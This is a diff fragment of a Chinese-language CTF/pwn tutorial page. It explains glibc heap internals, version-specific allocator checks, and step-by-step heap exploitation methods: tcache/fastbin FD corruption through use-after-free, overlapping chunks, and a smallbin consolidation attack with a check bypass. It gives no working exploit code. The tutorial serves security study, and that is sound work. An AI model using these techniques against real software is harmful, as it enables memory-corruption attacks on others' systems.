+<li><code>offset</code>：第一个可控“参数槽”的位置（即你测出来的 <code>%n$p</code> 起点）。</li>
+<li><code>writes</code>：要写入的目标，字典 <code>&#123;address: value, ...&#125;</code>。（将value写进address里）</li>
+<li><code>numbwritten</code>：调用 <code>printf</code> 前已经输出的字节数（影响对齐/填充计算）。</li>
+<li><code>write_size</code>：原子写入粒度，<code>&#39;byte&#39;|&#39;short&#39;|&#39;int&#39;|&#39;long&#39;</code> 等。</li>
+</ul>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a><strong>例题</strong></h3><ul>
+<li><a href="https://archer-baiyi.github.io/2025/05/19/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb-Writeup/">攻防世界 CGfsb Writeup</a></li>
+</ul>
+<h2 id="堆利用-Heap-Exploitation"><a href="#堆利用-Heap-Exploitation" class="headerlink" title="堆利用/Heap Exploitation"></a><strong>堆利用/Heap Exploitation</strong></h2><p>堆利用（Heap Exploitation）和核心/最终目的是劫持分配器 (Hijacking the Allocator)，让其误以为敏感地址（如 GOT 表、栈上的返回地址、Hook 函数指针）是空闲链表里的一块普通内存，并将其分配给我们，以达到任意写入的目的。当然在此之前还需要信息泄露用于确定我们该往哪里进行写入。</p>
+<p>首先先区分一下libc和glibc：</p>
+<ul>
+<li><p><strong>libc</strong>（C Library）通常指的是<strong>标准 C 库</strong>。它是一套基础函数的<strong>标准规范</strong>。</p>
+<p>比如说标准（libc）只规定了<code>malloc</code>和<code>free</code>怎么用。</p>
+</li>
+<li><p><strong>glibc</strong>（GNU C Library）是 <strong>GNU 项目</strong>对上述 libc 标准的<strong>具体代码实现</strong>。</p>
+<p>会决定具体如何管理堆内存（Chunk 结构、Bin 链表、Tcache 机制）。</p>
+</li>
+</ul>
+<p><img src="/images/image-20251127104004619.png" class="lazyload" data-srcset="/images/image-20251127104004619.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127104004619"></p>
+<p><strong>Chunk（堆块）结构：</strong> 堆内存被划分为一个个 Chunk。每个 Chunk 包含头部信息（Header）和用户数据区 ：</p>
+<ul>
+<li><strong>头部字段 (Header)：</strong><ul>
+<li><code>prev_size</code>：如果前一个物理相邻的 Chunk 是空闲的，这里存储前一个 Chunk 的大小；如果前一个是使用中的，这里归属于前一个 Chunk 的用户数据区 。</li>
+<li><code>size</code>：当前 Chunk 的大小，低 3 位用于存储标志位（如 <code>prev_in_use</code>，表示前一个块是否在使用中） 。</li>
+<li><strong>空闲时的指针：</strong> 当 Chunk 被释放（Free）后，用户数据区的前 16 字节会被复用为 <code>fd</code> (Forward Pointer) 和 <code>bw/bk</code> (Backward Pointer)，分别指向链表中的下一个和上一个空闲块 。</li>
+</ul>
+</li>
+<li>内存布局：堆是从低地址向高地址增长的。Chunk 的大小通常以 <code>0x10</code>（16字节）对齐 。</li>
+</ul>
+<p><strong>堆管理列表 (Bins)：</strong> glibc使用多种链表（Bins）来管理空闲的Chunk，以提高分配效率。常见的几种：</p>
+<ul>
+<li><strong>Fastbin:</strong><ul>
+<li>单向链表 (Singly-linked)，LIFO (后进先出) 。</li>
+<li>管理小块内存，大小范围 <code>[0x20, 0x80]</code> 。</li>
+<li>每个大小都有独立的链表 。</li>
+</ul>
+</li>
+<li><strong>Tcache (Thread Local Cache):</strong><ul>
+<li><strong>最重要特性：</strong> glibc 2.26 引入，为了性能设计，每个线程独有。</li>
+<li>单向链表，LIFO 。</li>
+<li>大小范围 <code>[0x20, 0x410]</code> 。</li>
+<li>分配和释放优先级最高，且默认不进行合并 。</li>
+<li>每个链表最多容纳 7 个块 (Count=7) 。</li>
+</ul>
+</li>
+<li><strong>Smallbin:</strong><ul>
+<li>双向链表 (Doubly-linked)，FIFO 。</li>
+<li>大小范围 <code>[0x20, 0x400]</code> 。</li>
+</ul>
+</li>
+<li><strong>Unsorted Bin:</strong><ul>
+<li>双向链表，仅有一个列表 。</li>
+<li>作为缓存层，刚释放且未进入 Tcache/Fastbin 的块会先放入这里 。</li>
+</ul>
+</li>
+<li><strong>Top Chunk:</strong> 位于堆顶部的巨大空闲块，当 bins 中没有合适的块时，从这里切割内存 。</li>
+</ul>
+<p><img src="/images/image-20251127105623146.png" class="lazyload" data-srcset="/images/image-20251127105623146.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127105623146"></p>
+<p><strong>1. 空闲块的合并机制 (Merging)</strong></p>
+<p>glibc 为了防止内存碎片化，通常会尝试把相邻的空闲块合并成一个大块。</p>
+<ul>
+<li><strong>默认合并对象：</strong><ul>
+<li>属于 <strong>双向链表</strong>（Smallbin, Largebin, Unsorted Bin）中的空闲块以及 <strong>Top Chunk</strong> 。</li>
+<li>当你释放（free）这些块时，如果它们物理相邻，它们会立即合并。</li>
+</ul>
+</li>
+<li><strong>Fastbin 的特殊情况：</strong><ul>
+<li>Fastbin默认<strong>不</strong>合并（为了速度）。</li>
+<li><strong>但是</strong>，当程序申请一个较大的内存块（Large Allocation）时，会触发 <code>malloc_consolidate</code> 函数 。</li>
+<li>这个函数会清理 Fastbin，强制将里面的块进行合并，放入Unsorted Bin中。</li>
+</ul>
+</li>
+<li><strong>Tcache 的特殊情况：</strong><ul>
+<li><strong>Tcache Chunks 永远不会合并</strong> 。</li>
+<li>这是Tcache速度极快的原因，也是它的缺点（容易导致堆碎片，但也容易被利用来保留特定大小的空闲块）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>2. Tcache 的核心特性 (Regarding tcaches)</strong></p>
+<p>Tcache 是 glibc 为了提升多线程性能引入的机制，有几个关键特性：</p>
+<ul>
+<li><strong>优先级最高 (L1 Cache)：</strong><ul>
+<li>它在大多数其他堆逻辑<strong>之前</strong>被填充和提取 。</li>
+<li>这意味着：<code>malloc</code> 时先看Tcache有没有；<code>free</code>时先放进Tcache。只有Tcache满了或空了，才会去操作 Fastbin/Smallbin等。</li>
+</ul>
+</li>
+<li><strong>容量限制 (Max-fill of 7)：</strong><ul>
+<li>每个大小（Size Class）的链表最多只存 <strong>7 个</strong> Chunk 。</li>
+<li>攻击意义： 如果你想把一个块放入Fastbin或Unsorted Bin以触发更复杂的漏洞（如 Unsorted Bin Leak），你需要先<code>free</code>7个同大小的块把Tcache填满，第8个才会落入其他Bin。</li>
+</ul>
+</li>
+<li><strong>管理结构在堆上 (On the heap)：</strong><ul>
+<li>Tcache的管理结构（<code>tcache_perthread_struct</code>，存着链表头指针数组）本身也是分配在<strong>堆</strong>上的 。</li>
+<li>攻击意义： 如果你能劫持这个管理结构，你就能控制整个线程的堆分配。</li>
+</ul>
+</li>
+<li><strong>安全检查 (Key)：</strong><ul>
+<li>Tcache是单向链表，原本不需要<code>bk</code>指针。</li>
+<li>但是为了防止 <strong>Double Free</strong>（双重释放），glibc会在空闲Tcache Chunk 的<code>bk</code>位置存储一个 <strong><code>tcache key</code></strong>（通常指向 <code>tcache_perthread_struct</code> 的地址）。</li>
+<li>当你释放一个块时，系统会检查 <code>bk</code> 位置是否等于这个 key，如果是，则遍历链表检查是否重复释放。</li>
+</ul>
+</li>
+</ul>
+<p><br><br>不同libc版本的安全检查以及分配策略都是不太一样的。</p>
+<h4 id="Glibc-2-31"><a href="#Glibc-2-31" class="headerlink" title="Glibc 2.31"></a><strong>Glibc 2.31</strong></h4><p><img src="/images/image-20251127114018747.png" class="lazyload" data-srcset="/images/image-20251127114018747.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127114018747"></p>
+<p><strong>1. Fastbin 的检查：</strong></p>
+<p>Fastbin 是单向链表，性能仅次于 Tcache。</p>
+<ul>
+<li><strong>Malloc:</strong><ul>
+<li><strong><code>alloc_size == stored size</code> (Size Integrity)</strong><ul>
+<li>含义： 当从 Fastbin 取出一个块时，系统会检查这个块头部的 <code>size</code> 字段，看它是否真的属于当前这个 Bin 的大小范围。</li>
+<li>攻击后果： 如果你想伪造一个 Fastbin Chunk（比如在栈上伪造），你必须确保伪造地址的偏移处有一个正确的 <code>size</code> 数值，否则程序会崩溃。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Free:</strong><ul>
+<li><strong><code>valid next size</code></strong>: 检查内存中<strong>下一个</strong>物理相邻块的大小字段是否合理。这是为了防止因溢出导致的元数据损坏。</li>
+<li><strong><code>addr != head</code> (弱 Double Free 检查)</strong>:<ul>
+<li>它只检查链表的<strong>头节点</strong>是不是当前要释放的地址。</li>
+<li>绕过： 这就是经典的 <strong>ABA 问题</strong>。你释放 A，链表头是 A；你释放 B，链表头变成 B；你<strong>再次</strong>释放 A，因为此时链表头是 B (A != B)，检查通过。A 成功进入链表两次。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>2. Smallbin的检查：</strong></p>
+<p>Smallbin 是双向链表，管理较大内存，安全性最高。</p>
+<ul>
+<li><strong>Malloc:</strong><ul>
+<li><strong><code>bk-&gt;fd == addr</code> (Safe Unlink)</strong><ul>
+<li>含义： 这是最著名的堆保护机制。当从双向链表取出一个块（Unlink）时，系统会检查：这个块的<strong>后一个块的前向指针</strong>，是否指回这个块本身？</li>
+<li>公式： <code>P-&gt;bk-&gt;fd == P</code></li>
+<li>攻击后果： 这使得经典的“Unlink 攻击”（通过修改 fd/bk 实现任意地址写）在现代 glibc 中基本失效，除非你能同时伪造好 fd 和 bk 指向的内存内容。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Free:</strong><ul>
+<li><code>chunk is in-use</code>:<ul>
+<li>它会检查<strong>下一个</strong>物理相邻 Chunk 的 <code>prev_in_use</code> 位（P-bit）。如果 P-bit 为 0，说明当前块已经是空闲状态了，系统就会报错，防止 Double Free。</li>
+</ul>
+</li>
+<li><code>unsorted head is valid</code>: 针对 Unsorted Bin 的完整性检查。</li>
+</ul>
+</li>
+</ul>
+<p><strong>3. Chunk Consolidation (块合并)</strong></p>
+<p>这部分指的是当Smallbin/Largebin发生物理合并时（比如你释放一个块，它发现前一个块也是空闲的，就要合并成一个大块）。</p>
+<ul>
+<li><strong><code>prevsize == chunksize(p)</code></strong>:<ul>
+<li>含义： 当前块的 <code>prev_size</code> 脚标，必须等于前一个块头部的 <code>size</code>。</li>
+<li>目的： 防止 Off-by-one 漏洞利用（比如 Poison Null Byte 攻击）。如果攻击者偷偷改小了 <code>prev_size</code> 试图让堆管理器“吃掉”正在使用的内存，这个检查会拦截。</li>
+</ul>
+</li>
+<li><strong><code>Valid doubly linked list pointers</code></strong>:<ul>
+<li>在合并过程中，被吞并的空闲块需要从链表中移除，此时会再次触发类似 Safe Unlink 的检查。</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/image-20251127114037904.png" class="lazyload" data-srcset="/images/image-20251127114037904.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127114037904"></p>
+<p><strong>1. Malloc 时的检查：无</strong></p>
+<ul>
+<li><p>它不检查取出的 Chunk 大小是否正确。</p>
+</li>
+<li><p>它不检查指针是否对齐。</p>
+</li>
+<li>它直接相信链表头部的指针（FD）。</li>
+</ul>
+<p><strong>2. Free 时的检查：</strong></p>
+<p>虽然 <code>malloc</code> 不管，但在 <code>free</code> 时 Tcache 还是做了一些防御，主要是为了防止 <strong>Double Free</strong>。</p>
+<ul>
+<li><strong><code>valid stored size</code></strong><ul>
+<li>检查你要释放的地址处的 <code>size</code> 字段是否合法（比如大小不能太离谱，且必须对齐）。</li>
+</ul>
+</li>
+<li><strong><code>key/bk != tcache_key || chunk not in tcache list</code> (Double Free 检查)</strong><ul>
+<li>背景： Tcache 是单向链表，本来不需要 <code>bk</code> 指针。glibc 这里复用了 <code>bk</code> 的位置（用户数据的第 8-15 字节）来存放一个随机生成的 <strong><code>tcache_key</code></strong>（通常指向堆管理结构）。</li>
+<li><strong>逻辑：</strong> 当调用 <code>free(ptr)</code> 时：<ol>
+<li>系统先检查 <code>ptr-&gt;bk</code> 是否等于 <code>tcache_key</code>。</li>
+<li><strong>如果不等于：</strong> 系统认为这是一个新释放的块，直接放入链表，并把 key 写入 <code>bk</code> 位置。</li>
+<li><strong>如果等于：</strong> 系统怀疑你正在 Double Free。于是它会<strong>遍历整个链表</strong>，检查里面是不是真的已经有了这个 Chunk。</li>
+</ol>
+</li>
+<li><strong>绕过思路：</strong> 如果能利用 Use-After-Free (UAF) 改写该 Chunk 的 <code>bk</code> 位置（把 key 覆盖掉），就可以绕过这个检查，再次释放它，从而实现 Double Free。</li>
+</ul>
+</li>
+</ul>
+<h4 id="Glibc-2-41"><a href="#Glibc-2-41" class="headerlink" title="Glibc 2.41"></a><strong>Glibc 2.41</strong></h4><p>随着libc版本的更新，发生了很多的变化，所以很多针对老版本libc的heap exploitation的攻击没有办法应用在新版的libc里。</p>
+<p><img src="/images/image-20251212211140806.png" class="lazyload" data-srcset="/images/image-20251212211140806.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251212211140806"></p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a><strong>攻击方法</strong></h3><h4 id="1-Fastbin-Tcache-FD-Corruption-FD-指针篡改"><a href="#1-Fastbin-Tcache-FD-Corruption-FD-指针篡改" class="headerlink" title="1. Fastbin/Tcache FD Corruption (FD 指针篡改)"></a><strong>1. Fastbin/Tcache FD Corruption (FD 指针篡改)</strong></h4><p><strong>利用 Use-After-Free (UAF) 实现任意地址分配（Arbitrary Chunk Allocation）。</strong></p>
+<ul>
+<li><strong>场景：</strong> 针对单向链表（Tcache 或 Fastbin）。</li>
+<li><strong>步骤：</strong><ol>
+<li>释放一个Chunk A，它进入空闲链表 。</li>
+<li>利用悬挂指针（UAF）修改Chunk A的<code>fd</code>指针，将其指向目标地址<code>&lt;victim&gt;</code>（例如栈地址或 libc 中的 hook） 。</li>
+<li>第一次<code>malloc</code>取出 Chunk A 。</li>
+<li>第二次<code>malloc</code>就会返回 <code>&lt;victim&gt;</code> 地址，从而控制该区域内存 。</li>
+</ol>
+</li>
+</ul>
+<p><strong>图示：</strong></p>
+<p><img src="/images/image-20251127132419482.png" class="lazyload" data-srcset="/images/image-20251127132419482.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127132419482"></p>
+<p><img src="/images/image-20251127132440833.png" class="lazyload" data-srcset="/images/image-20251127132440833.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127132440833"></p>
+<h4 id="2-Size-Corruption-大小篡改-Overlapping-Chunks"><a href="#2-Size-Corruption-大小篡改-Overlapping-Chunks" class="headerlink" title="2. Size Corruption (大小篡改 / Overlapping Chunks)"></a><strong>2. Size Corruption (大小篡改 / Overlapping Chunks)</strong></h4><p><strong>通过修改 Chunk 的头部大小字段，制造堆块重叠。</strong></p>
+<ul>
+<li><strong>场景：</strong>内存中有连续的Chunk A, B, C。</li>
+<li><strong>步骤：</strong><ol>
+<li>利用Chunk A的溢出漏洞，覆盖Chunk B的头部 。</li>
+<li>将Chunk B的 <code>size</code> 改大（例如从 0x21 改为 0x41），使其覆盖到Chunk C 。</li>
+<li>释放Chunk B 。</li>
+<li>重新申请一个较大的内存（例如 0x38），系统会分配原 B 的空间，但由于大小已变，新的Chunk D会覆盖原本的Chunk C 。</li>
+<li><strong>结果：</strong> 攻击者可以通过编辑Chunk D来控制Chunk C的内容（即使用户认为 C 仍在使用中） 。</li>
+</ol>
+</li>
+</ul>
+<p><strong>图示：</strong></p>
+<p><img src="/images/image-20251127132620777.png" class="lazyload" data-srcset="/images/image-20251127132620777.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127132620777"></p>
+<p><img src="/images/image-20251127132629654.png" class="lazyload" data-srcset="/images/image-20251127132629654.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127132629654"></p>
+<p><img src="/images/image-20251127132641176.png" class="lazyload" data-srcset="/images/image-20251127132641176.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127132641176"></p>
+<p><img src="/images/image-20251127132655280.png" class="lazyload" data-srcset="/images/image-20251127132655280.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127132655280"></p>
+<h4 id="3-Smallbin-Consolidation-Smallbin-合并攻击"><a href="#3-Smallbin-Consolidation-Smallbin-合并攻击" class="headerlink" title="3. Smallbin Consolidation (Smallbin 合并攻击)"></a><strong>3. Smallbin Consolidation (Smallbin 合并攻击)</strong></h4><p><strong>利用的是 <code>malloc_consolidate</code> 和 <code>unlink</code> 机制来构造重叠块（Overlapping Chunks）或绕过某些限制。</strong></p>
+<ul>
+<li><strong>前提：</strong> 利用 <code>prev_size</code> 和 <code>prev_in_use</code> 位的逻辑。</li>
+<li><strong>布局：</strong> 连续的 Chunk A, B, C, D。</li>
+<li><strong>步骤：</strong><ol>
+<li>释放Chunk A（放入 Unsorted/Smallbin，建立合法的 fd/bk 指针） 。</li>
+<li>利用Chunk B的溢出，修改Chunk C的头部：<ul>
+<li>将C的 <code>prev_size</code> 修改为 <code>size(A) + size(B)</code>（伪造前一个块非常大） 。</li>
+<li>将C的 <code>prev_in_use</code> 标志位置0（欺骗 C 认为前一个大块是空闲的） 。</li>
+</ul>
+</li>
+<li><strong>绕过检查 (glibc 2.29+)：</strong> 需要修改Chunk A的<code>size</code>字段，使其等于伪造的<code>prev_size</code>，以通过完整性检查 。</li>
+<li>释放Chunk C 。</li>
+<li><strong>触发合并：</strong> glibc 检测到 C 的 <code>prev_in_use</code> 为 0，根据 <code>prev_size</code> 向后合并，吞并了正在使用的 Chunk B，与Chunk A合并成一个巨大的空闲块 。</li>
+<li>重新申请一个大块E 。</li>
+<li><strong>结果：</strong> Chunk E完全包含了仍在“使用中”的 Chunk B，攻击者完全控制了 B 的数据 。</li>
+</ol>
+</li>
+</ul>
+<p><strong>图示：</strong></p>
+<p><img src="/images/image-20251127133204988.png" class="lazyload" data-srcset="/images/image-20251127133204988.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127133204988"></p>
+<p><img src="/images/image-20251127133220804.png" class="lazyload" data-srcset="/images/image-20251127133220804.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127133220804"></p>
+<p><img src="/images/image-20251127133233311.png" class="lazyload" data-srcset="/images/image-20251127133233311.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127133233311"></p>
+<p><img src="/images/image-20251127133248009.png" class="lazyload" data-srcset="/images/image-20251127133248009.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127133248009"></p>
+<p><img src="/images/image-20251127133302587.png" class="lazyload" data-srcset="/images/image-20251127133302587.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127133302587"></p>
+<p><img src="/images/image-20251127133337054.png" class="lazyload" data-srcset="/images/image-20251127133337054.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127133337054"></p>
+<p>现代</p>
+<h3 id="推荐工具"><a href="#推荐工具" class="headerlink" title="推荐工具"></a><strong>推荐工具</strong></h3><ul>
+<li><p><strong>forkever (by haxkor)</strong> </p>
+<ul>
+<li><p><strong>功能：</strong> 允许模拟堆操作并支持<strong>检查点 (Checkpoints)</strong> 功能 。</p>
+</li>
+<li><p><strong>作用：</strong> 在编写 Exploit 时，经常需要反复尝试某一步骤。这个工具可能类似于虚拟机的快照功能，让你在堆的某个特定状态下反复尝试不同的攻击载荷，而不需要每次都重新启动程序，大大提高了调试效率。</p>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/haxkor/forkever">https://github.com/haxkor/forkever</a></li>
+</ul>
+</li>
+<li><p><strong>pwndbg-gui (by AlEscher)</strong> </p>
+<ul>
+<li><p><strong>功能：</strong> 为著名的 GDB 插件 <code>pwndbg</code> 提供图形化界面，并增强了堆上下文 (Heap Context) 的显示 。</p>
+</li>
+<li><p><strong>作用：</strong> 原生的 GDB/pwndbg 是命令行界面，查看堆链表时比较抽象。这个工具通过 GUI 可视化展示 Bin 的状态，让你更直观地看到堆块是如何链接的。</p>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/AlEscher/pwndbg-gui">https://github.com/AlEscher/pwndbg-gui</a></li>
+</ul>
+</li>
+<li><p><strong>ptrfind (by ChaChaNop-Slide)</strong></p>
+<ul>
+<li><p><strong>功能：</strong> 寻找指针和指针链，以利用任意读写 (Arbitrary Read/Write) 。</p>
+</li>
+<li><p><strong>作用：</strong> 在堆利用中，经常需要通过多级指针跳转找到目标地址（比如通过 <code>environ</code> 找栈地址）。这个工具能自动化寻找这些指针路径，省去了人工计算偏移的繁琐工作。</p>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ChaChaNop-Slide/ptrfind">https://github.com/ChaChaNop-Slide/ptrfind</a></li>
+</ul>
+</li>
+<li><p><strong>heapvis (by Staeves)</strong> </p>
+<ul>
+<li><p><strong>功能：</strong> 专门针对 <strong>libc 2.31</strong> 版本的堆可视化工具 。</p>
+</li>
+<li><p><strong>作用：</strong> 配合本课程讲授的 libc 版本（2.31），将抽象的堆内存布局画出来，帮助你理解 Chunk 的排列和状态。</p>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Staeves/heapvis">https://github.com/Staeves/heapvis</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a><strong>学习资料</strong></h3><ul>
+<li><strong>how2heap</strong><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></li>
+</ul>
+</li>
+<li><strong>Malloc Maleficarium</strong><ul>
+<li>比较古早但很经典的文章。</li>
+<li><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/40638/MallocMaleficarum.txt.html">https://packetstormsecurity.com/files/40638/MallocMaleficarum.txt.html</a></li>
+<li>不知道为什么Chrome访问这个网址会有问题，但是Firefox就可以。</li>
+</ul>
+</li>
+<li><a target="_blank" rel="noopener" href="https://heap-exploitation.dhavalkapil.com/">https://heap-exploitation.dhavalkapil.com/</a></li>
+</ul>
+<h3 id="常用pwndbg命令"><a href="#常用pwndbg命令" class="headerlink" title="常用pwndbg命令"></a><strong>常用pwndbg命令</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 概览</span></span><br><span class="line">heap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细模式</span></span><br><span class="line">heap -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 看某个地址附近/对应的 heap 信息</span></span><br><span class="line">heap 0x405000</span><br><span class="line"></span><br><span class="line">bins</span><br><span class="line"></span><br><span class="line">tcache</span><br></pre></td></tr></table></figure>
+<h2 id="题目分类"><a href="#题目分类" class="headerlink" title="题目分类"></a><strong>题目分类</strong></h2><ol>
 <li><strong>Pwn相关基础知识</strong>：<ol>
 <li><a href="https://archer-baiyi.github.io/2025/06/09/CTF/Pwn/HTB-Questionnaire-Writeup/">HTB Questionnaire Writeup</a></li>
 <li><a href="https://archer-baiyi.github.io/2025/08/21/CTF/Pwn/HTB-Lesson-Writeup/">HTB Lesson Writeup</a></li>
@@ -3239,7 +3919,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
   <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%EF%BC%88Address-space%EF%BC%8CProzess-Adressraum%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">地址空间（Address space，Prozess Adressraum）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#X86%E6%B1%87%E7%BC%96"><span class="toc-number">1.2.</span> <span class="toc-text">X86汇编</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%80%A7%E6%A3%80%E6%9F%A5"><span class="toc-number">2.</span> <span class="toc-text">安全性检查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GDB"><span class="toc-number">3.1.</span> <span class="toc-text">GDB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">3.1.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85Pwndbg"><span class="toc-number">3.1.2.</span> <span class="toc-text">安装Pwndbg</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.3.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%81%8F%E7%A7%BB"><span class="toc-number">3.1.4.</span> <span class="toc-text">确定返回地址偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">3.1.5.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA-Ghidra"><span class="toc-number">3.2.</span> <span class="toc-text">IDA&#x2F;Ghidra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwntools"><span class="toc-number">3.3.</span> <span class="toc-text">Pwntools</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8-API%EF%BC%88%E6%8C%89%E4%BB%BB%E5%8A%A1%E5%88%86%E7%B1%BB%EF%BC%89"><span class="toc-number">3.3.2.</span> <span class="toc-text">常用 API（按任务分类）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">3.3.3.</span> <span class="toc-text">模板</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ropgadget"><span class="toc-number">3.4.</span> <span class="toc-text">Ropgadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">漏洞以及利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA-Buffer-Overflow"><span class="toc-number">5.</span> <span class="toc-text">溢出 Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E-%E5%B8%B8%E8%A7%81%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞&#x2F;常见危险函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93%E5%AD%97%E6%AE%B5%E5%8A%AB%E6%8C%81"><span class="toc-number">5.2.</span> <span class="toc-text">结构体字段劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP%EF%BC%88Return-Oriented-Programming%EF%BC%89"><span class="toc-number">5.3.</span> <span class="toc-text">ROP（Return Oriented Programming）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2text"><span class="toc-number">5.3.1.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">5.3.2.</span> <span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2libc"><span class="toc-number">5.3.3.</span> <span 